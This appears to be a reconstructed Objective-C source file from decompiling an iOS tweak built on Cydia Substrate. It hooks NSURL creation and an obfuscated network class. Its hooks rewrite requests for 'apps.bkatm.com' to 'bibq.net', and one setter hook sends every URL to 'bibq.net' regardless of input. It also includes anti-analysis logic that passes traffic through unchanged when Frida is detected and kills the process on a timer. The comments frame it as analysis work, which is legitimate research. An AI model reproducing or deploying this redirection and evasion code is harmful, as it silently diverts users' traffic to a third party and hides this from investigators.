// NetHelperHooks.m
// Reconstructed from:
//   sub_420C (0x420C) — +[NSURL URLWithString:] hook
//   sub_44AC (0x44AC) — iCdfsIdfdEdfsNdfdftqWer::url getter hook
//   sub_46D8 (0x46D8) — iCdfsIdfdEdfsNdfdftqWer::setUrl: setter hook
//   sub_47F4 (0x47F4) — periodic anti-Frida timer handler
//
// URL redirect logic:
//   sub_420C, sub_44AC: case-insensitive search for "apps.bkatm.com" → replace with "bibq.net"
//   sub_46D8: UNCONDITIONAL — always sets URL to "bibq.net" regardless of input
//
// The counter dword_C074 (distinct from dword_C070) is used in sub_47F4.
// dword_C070 counts URLWithString: calls; dword_C074 counts timer ticks.

#import "NetHelperHooks.h"
#import <objc/runtime.h>
#import <substrate.h>
#import <string.h>
#import <stdlib.h>

// ── Saved original IMPs ──
static IMP orig_URLWithString = NULL;  // off_C050: +[NSURL URLWithString:]
static IMP orig_url_getter    = NULL;  // off_C058: iCdfsIdfdEdfsNdfdftqWer::url
static IMP orig_setUrl        = NULL;  // off_C060: iCdfsIdfdEdfsNdfdftqWer::setUrl:

// Timer tick counter (dword_C074) — separate from URL call counter
static int s_timerTickCount = 0;  // dword_C074

// ── URL replacement helper ──
// Case-insensitive search for fromDomain; returns modified string or original.
// Mirrors the lowercaseString + rangeOfString: + stringByReplacingOccurrencesOfString: pattern.
static NSString *NetHelperReplace(NSString *url) {
    if (!url) return url;

    char v1[32], v2[32];
    strcpy(v1, kNetHelperFromDomain);
    strcpy(v2, kNetHelperToDomain);

    // Only build replacement strings when not under Frida
    if (g_fridaDetected) return url;

    NSString *from = [NSString stringWithUTF8String:v1];
    NSString *to   = [NSString stringWithUTF8String:v2];
    if (!from || !to) return url;

    NSString *lowerURL  = [url lowercaseString];
    NSString *lowerFrom = [from lowercaseString];
    NSRange range = [lowerURL rangeOfString:lowerFrom];

    if (range.location == NSNotFound) return url;

    // options=1 = NSCaseInsensitiveSearch
    return [url stringByReplacingOccurrencesOfString:from
                                          withString:to
                                             options:NSCaseInsensitiveSearch
                                               range:NSMakeRange(0, url.length)];
}

// ══════════════════════════════════════════════════════════════
// sub_420C — +[NSURL URLWithString:] hook
// ══════════════════════════════════════════════════════════════
// Intercepts every NSURL creation from a string.
// Replaces "apps.bkatm.com" with "bibq.net" in the URL string before creating the NSURL.
static id NetHelper_hook_URLWithString(id cls, SEL cmd, NSString *urlString) {
    typedef id (*Fn)(id, SEL, NSString *);

    if (!orig_URLWithString) return nil;

    // Guard: if Frida detected or guard flag set → pass through unmodified
    if ((g_fridaDetected & 1) || g_guardFlag) {
        return ((Fn)orig_URLWithString)(cls, cmd, urlString);
    }

    // Increment call counter (wraps at 9999)
    g_urlCallCount = (g_urlCallCount < 9999) ? g_urlCallCount + 1 : 0;

    if (!urlString) {
        return ((Fn)orig_URLWithString)(cls, cmd, nil);
    }

    NSString *modified = NetHelperReplace(urlString);
    return ((Fn)orig_URLWithString)(cls, cmd, modified);
}

// ══════════════════════════════════════════════════════════════
// sub_44AC — iCdfsIdfdEdfsNdfdftqWer::url getter hook
// ══════════════════════════════════════════════════════════════
// Intercepts the url property getter.
// Calls original first, then replaces the returned URL if it contains "apps.bkatm.com".
static NSString *NetHelper_hook_url(id self, SEL cmd) {
    typedef NSString *(*Fn)(id, SEL);

    if (!orig_url_getter) return nil;

    // Call original getter
    NSString *original = ((Fn)orig_url_getter)(self, cmd);

    // Guard: if Frida detected → return original unchanged
    if (g_fridaDetected & 1) return original;

    if (!original) return nil;

    return NetHelperReplace(original);
}

// ══════════════════════════════════════════════════════════════
// sub_46D8 — iCdfsIdfdEdfsNdfdftqWer::setUrl: setter hook
// ══════════════════════════════════════════════════════════════
// Intercepts the url property setter.
//
// KEY DIFFERENCE: This does NOT check for "apps.bkatm.com".
// It UNCONDITIONALLY replaces ANY URL being set with "bibq.net".
// This ensures this class (the network request object) ALWAYS connects
// to bibq.net, regardless of what URL the app code specifies.
//
// When Frida is detected (byte_C068==1): pass the original URL through unchanged.
static void NetHelper_hook_setUrl(id self, SEL cmd, NSString *urlString) {
    typedef void (*Fn)(id, SEL, NSString *);

    if (!orig_setUrl) return;

    if (g_fridaDetected == 1) {
        // Frida mode: use original URL (look normal to the analyst)
        ((Fn)orig_setUrl)(self, cmd, urlString);
        return;
    }

    // Unconditional redirect: always set to target domain
    char v[64];
    strcpy(v, kNetHelperToDomain);
    NSString *replacement = [NSString stringWithUTF8String:v];
    if (replacement) {
        ((Fn)orig_setUrl)(self, cmd, replacement);
    } else {
        ((Fn)orig_setUrl)(self, cmd, urlString);  // allocation failed: fallback
    }
}

// ══════════════════════════════════════════════════════════════
// sub_47F4 — 5-second timer event handler (anti-Frida)
// ══════════════════════════════════════════════════════════════
// Called every 5 seconds by the GCD timer in sub_4000.
// If Frida is present (flags set) → kill the process.
// Otherwise → periodic counter, reset flags after 1000 ticks (~83 min).
void NetHelperTimerTick(void) {
    // Re-check Frida flags (may have been set after startup if Frida attached late)
    if ((g_fridaDetected & 1) || g_guardFlag) {
        exit(0);  // hard-kill — no cleanup
    }

    s_timerTickCount++;
    if (s_timerTickCount >= 1000) {
        g_fridaDetected  = NO;
        g_guardFlag      = NO;
        s_timerTickCount = 0;
    }
}

// ══════════════════════════════════════════════════════════════
// NetHelperInstallHooks — called from sub_4000 constructor
// ══════════════════════════════════════════════════════════════
void NetHelperInstallHooks(void) {
    // Hook +[NSURL URLWithString:] on the NSURL metaclass
    Class nsurlClass = [NSURL class];
    Class nsurlMeta  = object_getClass((id)nsurlClass);
    if (nsurlMeta) {
        MSHookMessageEx(nsurlMeta,
                        @selector(URLWithString:),
                        (IMP)NetHelper_hook_URLWithString,
                        &orig_URLWithString);
    }

    // Hook url and setUrl: on the obfuscated network request class
    Class targetClass = objc_getClass(kNetHelperTargetClass);
    if (targetClass) {
        MSHookMessageEx(targetClass,
                        @selector(url),
                        (IMP)NetHelper_hook_url,
                        &orig_url_getter);

        MSHookMessageEx(targetClass,
                        @selector(setUrl:),
                        (IMP)NetHelper_hook_setUrl,
                        &orig_setUrl);
    }
}
